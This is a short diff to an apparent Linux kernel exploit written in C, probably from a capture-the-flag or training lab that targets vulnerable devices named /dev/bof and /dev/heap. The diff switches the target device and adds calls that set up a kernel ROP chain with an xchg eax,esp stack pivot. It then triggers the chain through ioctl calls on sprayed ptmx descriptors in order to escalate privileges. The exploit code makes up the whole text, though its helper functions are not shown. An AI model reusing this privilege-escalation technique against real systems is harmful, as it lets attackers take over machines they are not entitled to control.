@@ -23,7 +23,7 @@ int main(){
 	//open 10 fds for next ioctl usage.
 	for (int i = 0; i < 10 ; i++){
 		
-		fd  = open("/dev/bof", O_RDWR);
+		fd  = open("/dev/heap", O_RDWR);
 		if(fd == -1){
 			perror("open device wrong" );
 			return -1;
@@ -78,7 +78,10 @@ int main(){
 		ioctl(fds[4], 8, &p);
 	}
 
+	prepare_tf();
+	kernel_rop_escalate(xchgeaxesp_addr & 0xffffffff);
 	//go!
+	printf("[*]now go!\n");
 	for (int i=0; i < 0x100; i++){
 		ioctl(ptmx_fds[i], 0, 0);
 	}
